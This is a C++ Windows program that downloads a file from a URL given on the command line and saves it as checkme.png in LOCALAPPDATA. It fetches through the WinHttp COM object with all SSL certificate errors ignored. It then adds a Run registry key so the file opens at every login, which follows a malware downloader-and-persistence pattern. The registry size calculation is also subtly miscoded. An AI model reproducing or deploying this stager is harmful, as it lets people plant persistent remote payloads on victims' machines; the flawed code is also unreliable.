#include <windows.h>
#include <comdef.h>
#include <tchar.h>
#include <iostream>
#include <atlbase.h>

// Function to call a method/property of a COM object
VARIANT CallMethod(CComPtr<IDispatch> pRequest, const TCHAR* name, VARIANT* pArg, int argCount)
{
	DISPID dispid;
	// map method/property name to interger DISPID
	LPOLESTR oleName = const_cast<LPOLESTR>(name);
	pRequest->GetIDsOfNames(IID_NULL, &oleName, 1, LOCALE_USER_DEFAULT, &dispid);

	// prepare parameters for the method call
	DISPPARAMS params;
	params.rgvarg = pArg;
	params.cArgs = argCount;
	params.cNamedArgs = 0;
	params.rgdispidNamedArgs = nullptr;

	VARIANT result;
	// Initialize the VARIANT to avoid garbage value
	VariantInit(&result);
	// Access to the method/property exposed by COM object
	pRequest->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &params, &result, nullptr, nullptr);
	return result;
}

int _tmain(int argc, TCHAR* argv[]) {

	// Initialize COM library
	HRESULT hr = CoInitialize(NULL);
	if (FAILED(hr)) {
		_tprintf(_T("Failed to initialize COM library. Error code = 0x%X\n"), hr);
		return 1;
	}

	CLSID clsid;
	// Look up the CLSID from registry using the ProgID
	hr = CLSIDFromProgID(L"WinHttp.WinHttpRequest.5.1", &clsid);
	if (FAILED(hr)) {
		_tprintf(_T("CLSIDFromProgID failed. Error code = 0x%X\n"), hr);
		// Uninitialize COM library
		CoUninitialize();
		return 1;
	}

	// Create the COM object
	// return smart pointer to manage the COM interface pointer
	CComPtr<IDispatch> pRequest;
	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IDispatch, (void**)&pRequest);
	if (FAILED(hr)) {
		std::cout << "Failed to create COM instance" << std::endl;
		CoUninitialize();
		return 1;
	}

	// Set up arguments in reverse order
	CComVariant args[3] = { 0 };
	args[2] = CComVariant(L"GET");         
	args[1] = CComVariant(argv[1]);        
	args[0] = CComVariant(VARIANT_FALSE);

	// Open GET request
	CallMethod(pRequest, L"Open", args, 3);

	// Ignore self-signed certificate errors
	CComVariant sslArgs(13056); // Ignore all SSL errors
	CComVariant optArgs[2] = { sslArgs, 4 };
	CallMethod(pRequest, L"SetOption", optArgs, 2);

	// Send the request
	CallMethod(pRequest, L"Send", nullptr, 0);

	VARIANT vStatus = CallMethod(pRequest, L"Status", nullptr, 0);
	if (vStatus.vt == VT_I4)
		_tprintf(_T("HTTP Status: %d\n"), vStatus.lVal);
	VariantClear(&vStatus);

	// Get the path to LOCALAPPDATA
	TCHAR appDataPath[MAX_PATH];
	if (GetEnvironmentVariableW(L"LOCALAPPDATA", appDataPath, MAX_PATH) == 0) {
		_tprintf(_T("Failed to get LOCALAPPDATA path. Error code = %lu\n"), GetLastError());
		return 1;
	}

	// Create full file path
	TCHAR imagePath[MAX_PATH];
	_stprintf_s(imagePath, MAX_PATH, _T("%s\\checkme.png"), appDataPath);

	// Get the response
	VARIANT response = CallMethod(pRequest, L"ResponseBody", nullptr, 0);
	// Check if the response is a byte array
	if ((response.vt == (VT_ARRAY | VT_UI1)) && response.parray) {
		void* pData = nullptr;
		// Get pointer to the byte array data
		HRESULT hr = SafeArrayAccessData(response.parray, &pData);
		if (SUCCEEDED(hr)) {
			LONG lBound = 0, uBound = 0;
			SafeArrayGetLBound(response.parray, 1, &lBound);
			SafeArrayGetUBound(response.parray, 1, &uBound);
			// Calculate size of the array
			ULONG size = uBound - lBound + 1;

			HANDLE hFile = CreateFileW(imagePath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
			if (hFile != INVALID_HANDLE_VALUE) {
				DWORD written = 0;
				WriteFile(hFile, pData, size, &written, nullptr);
				CloseHandle(hFile);
				_tprintf(_T("Saved %lu bytes to checkme.png\n"), written);
			}
			else {
				_tprintf(_T("Failed to create file. Error code = %lu\n"), GetLastError());
			}

			SafeArrayUnaccessData(response.parray);
		}
	}
	else {
		_tprintf(_T("Response is not a byte array.\n"));
		return 1;
	}

	VariantClear(&response);
	CoUninitialize();

	// Check if file was created
	if (GetFileAttributesW(imagePath) == INVALID_FILE_ATTRIBUTES) {
		_tprintf(_T("File does not exist: %s\n"), imagePath);
		return 1;
	}
	// Persistently open image on startup
	HKEY hKey;
	LPCWSTR subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
	if (result == ERROR_SUCCESS) {
		LPCWSTR valueName = L"OpenImage";
		std::wstring command = L"explorer.exe \"" + std::wstring(imagePath) + L"\"";

		result = RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), (DWORD)((wcslen(command.c_str() + 1) * sizeof(wchar_t))));
		if (result == ERROR_SUCCESS)
			_tprintf(_T("Successfully added registry value.\n"));
		else
			_tprintf(_T("Failed to set registry value. Error code = %ld\n"), result);

		RegCloseKey(hKey);
	}
	else {
		_tprintf(_T("Failed to open registry key. Error code = %ld\n"), result);
		return 1;
	}

	// Sleep 10 seconds and exit
	Sleep(10000);
	exit(0);
}

